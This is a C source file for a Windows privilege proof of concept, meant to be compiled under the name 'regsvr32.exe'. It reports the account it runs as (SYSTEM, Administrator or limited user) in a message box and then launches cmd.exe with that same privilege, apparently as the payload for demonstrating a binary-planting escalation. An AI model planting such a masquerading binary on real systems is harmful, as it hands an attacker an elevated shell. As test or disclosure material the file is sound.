#include <windows.h>
#include <sddl.h>
#include <stdio.h>

void ShowPrivilegeBox()
{
    HANDLE hToken = NULL;
    DWORD dwSize = 0;
    PTOKEN_USER pUser = NULL;
    WCHAR name[256] = L"Unknown";
    WCHAR domain[256] = L"";
    DWORD nameSize = 256, domainSize = 256;
    SID_NAME_USE peUse;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
        pUser = (PTOKEN_USER)LocalAlloc(0, dwSize);
        if (GetTokenInformation(hToken, TokenUser, pUser, dwSize, &dwSize))
        {
            LookupAccountSidW(NULL, pUser->User.Sid, name, &nameSize, domain, &domainSize, &peUse);
        }
        LocalFree(pUser);
        CloseHandle(hToken);
    }

    WCHAR message[512];
    wsprintfW(message, L"Running as: %s\\%s", domain, name);

    // Extra: Check for SYSTEM/Admin
    if (wcscmp(name, L"SYSTEM") == 0) {
        wcscat(message, L"\n\n*** SYSTEM Privilege ***");
    } else if (wcscmp(name, L"Administrator") == 0) {
        wcscat(message, L"\n\n*** Administrator Privilege ***");
    } else {
        wcscat(message, L"\n\n(Limited User)");
    }

    MessageBoxW(NULL, message, L"Privilege POC - regsvr32.exe", MB_OK | MB_TOPMOST);
}

void LaunchShell()
{
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // Launch as same user/privilege
    if (CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrev, LPWSTR lpCmdLine, int nShowCmd)
{
    ShowPrivilegeBox();
    LaunchShell();
    return 0;
}
// cl regsvr32.c user32.lib advapi32.lib
// VS Dev Prompt 2022
